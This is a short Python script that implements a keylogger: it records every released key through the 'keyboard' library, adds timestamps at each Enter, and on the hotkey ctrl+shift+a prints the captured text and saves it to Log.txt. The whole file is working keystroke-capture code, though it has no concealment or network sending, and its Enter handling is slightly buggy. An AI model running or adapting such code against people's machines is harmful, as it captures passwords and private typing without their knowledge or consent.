import keyboard
from datetime import datetime, date


class Logger:

    def __init__(self):
        self.log = ""
        self.log_filename = "Log.txt"

    def callback(self, event):
        """When a stroke happen this function is called"""

        name = event.name

        exception_key = ["backspace", "delete", "left", "right", "up", "down", "shift",
                         "ctrl", "right shift", "alt", "tab", ]

        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "decimal":
                name = "."
            elif name in exception_key:
                name = ""
            elif name == "enter":
                name = "\n"
                self.end_of_line()

        if name != "enter":
            self.log += name

    def end_of_line(self):
            self.log += "\n"
            self.add_timestamp()


    def start(self):
        keyboard.on_release(callback=self.callback)
        keyboard.wait(hotkey='ctrl+shift+a')
        print(self.log)
        self.write_log()

    def add_timestamp(self):
        """Take the line and add time stamp"""

        now = datetime.now()
        time_string = now.strftime("%Y-%m-%d %H:%M:%S")
        self.log += time_string

    def write_log(self):
        """Take the log and write it into a file"""

        with open(self.log_filename, 'w') as a:
            a.write(self.log)



if __name__ == '__main__':

    a = Logger()
    a.start()


